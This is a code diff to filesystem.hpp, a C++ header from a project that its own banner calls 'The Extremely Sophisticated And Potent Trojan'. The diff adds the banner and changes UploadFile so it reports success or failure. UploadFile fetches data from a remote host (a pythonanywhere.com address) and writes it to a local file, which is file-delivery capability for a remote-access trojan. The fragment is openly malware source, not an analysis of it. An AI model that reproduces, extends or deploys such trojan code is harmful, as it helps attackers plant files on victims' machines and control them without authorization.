@@ -1,9 +1,13 @@
 /*
-FILESYSTEM:
-change directory [ok]
-list current directory [ok]
-download file [ok]
-upload file [ok]
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<filesystem.hpp>
+This header contains functions under the filesystem category.
+
 */
 
 #include <iostream>
@@ -49,8 +53,12 @@ std::string DownloadFile(std::string file) {
     return fileID;
 }
 
-void UploadFile(std::string file, std::string fileID) {
+bool UploadFile(std::string file, std::string fileID) {
     std::string data = GET_Request("http://0x3af72.pythonanywhere.com/serve_temp/?f=" + fileID);
     std::ofstream pWrite(file, std::ios::binary);
+    if (!pWrite.is_open()) {
+        return false;
+    }
     WriteLong(pWrite, data);
+    return true;
 }
